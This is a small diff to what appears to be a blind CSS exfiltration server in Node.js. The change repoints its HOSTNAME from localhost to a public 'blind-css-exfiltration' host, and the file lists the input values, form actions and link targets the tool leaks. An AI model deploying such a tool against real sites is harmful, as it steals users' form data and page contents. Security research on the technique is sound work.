@@ -3,7 +3,7 @@ const http = require('http');
 const url = require('url');
 const port = 5001;
 
-const HOSTNAME = "http://localhost:5001";
+const HOSTNAME = "https://blind-css-exfiltration.onrender.com:5001";
 const ELEMENTS = ["input","textarea","form","a"];
 const ATTRIBUTES = {__proto__:null,"input":["value","name"],"textarea":["name"],"form":["action"],"a":["href"]};
 const MAX_ELEMENTS = 20;
